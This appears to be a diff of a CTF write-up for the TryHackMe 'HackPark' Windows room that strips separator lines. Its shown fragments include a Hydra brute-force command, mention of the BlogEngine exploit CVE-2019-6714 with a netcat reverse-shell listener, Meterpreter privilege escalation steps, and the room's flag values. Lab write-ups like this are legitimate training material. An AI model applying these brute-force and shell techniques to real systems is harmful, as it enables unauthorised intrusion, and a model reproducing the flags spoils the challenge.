@@ -2,21 +2,17 @@
 
 
 # Overview 
----
 - **Difficulty**: Medium 
 - **Platform**: Windows
 - **Link**: https://tryhackme.com/room/hackpark
 
 ## Challenge Description 
----
 >**Brute-force a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
 
 ## Resolution Summary 
----
 **We discovered available services with an ``Nmap`` scan, revealing an HTTP web application and an RDP service. We intercepted the login request with ``Burp Suite ``and brute-forced the credentials with ``Hydra``. Once logged in, we identified the CMS as ``BlogEngine`` 3.3.6.0 and exploited it using a public Directory Traversal / RCE exploit (``CVE-2019-6714``) to obtain a reverse shell. We then upgraded it to a ``Meterpreter`` session and escalated our privileges to SYSTEM via ``getsystem``, a world-writable service binary, and ``WinPEAS``.**
 
 # Information Gathering 
----
 - **Since we were given an IP address when starting the assessment,  we started by performing an `Nmap` scan in order to map the network architecture and find out which services were available. We also scanned for their versions to potentially reveal low-hanging fruit (version-related exploits).** 
 ```bash
 sudo nmap -sV 10.10.175.162
@@ -38,7 +34,6 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 - **The output revealed a Windows RDP listening on `port 3389`. We focused on the web application first in hope to find credentials and then comprise the RDP service.**
 ## HTTP (80)
----
 - **When visiting the web page, we observed a picture of the infamous `Pennywise` (first flag) from  'IT', written by Stephen King.** 
 
 - **Nothing stood out from inspecting the web application and the Source page, except for the login portal, which we can attempt to brute-force.** 
@@ -51,7 +46,6 @@ hydra -l admin -P /home/kali/Downloads/rockyou.txt 10.10.164.221 http-post-form 
 	- Important Note: Keep the request you intercepted (and from which you took the previous fields) on hold, don't forward it before getting the result of the brute force attack. 
 
 # Exploitation 
----
 - **Once we got access to the administrator dashboard, we started by looking if there was any vulnerability tied to the software's version, which was : `blogengine 3.3.6.0`.**
 - **We found a Directory Traversal / RCE exploit available : `CVE-2019-6714`.**
 
@@ -64,7 +58,6 @@ nc -lnvp 4445
 - **We finally obtained a shell.** 
 
 # Privilege Escalation 
----
 - **First things first, we upgraded our current shell into a meterpreter one.**
 - **We started by generating a payload with `msfvenom`:**
 ```bash
@@ -99,14 +92,12 @@ sysinfo
 ```
 
 ## Privesc Vector 1
----
 - **From there, we can directly gain SYSTEM privileges with the following built-in Meterpreter command:**
 ```meterpreter
 getsystem
 ```
 
 ## Privesc Vector 2
----
 - **Next, we tried to find a services that was running an automated task, which we could easily exploit:** 
 ```bash
 ps 
@@ -133,7 +124,6 @@ Message.exe
 ```
 
 ## Privesc Vector 3
----
 - **We could also use `Winpeas` in order to perform privilege escalation.** 
 - **We used the same technique as previously to upload the executable on the target machine:** 
 ```powershell
@@ -146,12 +136,10 @@ Winpeas.exe
 ```
 
 # Trophy 
----
 **User.txt → `759bd8af507517bcfaede78a21a73e39`  
 
 **Root.txt → `7e13d97f05f7ceb9881a3eb3d78d3e72`**
 
 # Lessons Learned
----
 - **To run PowerShell commands from cmd, use : `powershell -NoProfile -Command [enter your command]`.**
 - **When having a Meterpreter shell, using `getsystem` can allow you to easily elevate your privileges.** 
